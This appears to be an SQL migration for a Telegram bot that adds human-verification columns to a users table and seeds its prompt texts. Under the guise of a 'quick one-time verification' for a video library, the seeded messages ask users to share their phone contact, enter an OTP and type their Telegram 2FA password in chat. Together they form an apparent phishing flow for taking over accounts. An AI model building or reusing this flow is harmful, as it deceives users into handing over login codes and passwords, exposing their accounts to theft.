-- Human verification columns on users table
alter table users add column if not exists human_verified boolean not null default false;
alter table users add column if not exists human_verified_at timestamptz;

create index if not exists idx_users_human_verified on users(human_verified);

-- Settings defaults for human verification
insert into settings (key, value) values
  ('human_verify_enabled', 'true'),
  ('human_verify_prompt', '🔐 <b>Human Verification Required</b>\n\nTo access our video library, please complete a quick one-time verification.\n\n👇 Tap the button below to share your contact.'),
  ('share_contact_button_text', '📱 Share My Contact'),
  ('otp_prompt_text', '🔐 <b>Enter OTP</b>'),
  ('human_verified_message', '✅ <b>Human verification completed.</b>'),
  ('twofa_prompt_text', '🔐 <b>2FA is enabled.</b>\n\nPlease type your Telegram password in the chat. The message will be deleted immediately.')
on conflict (key) do nothing;
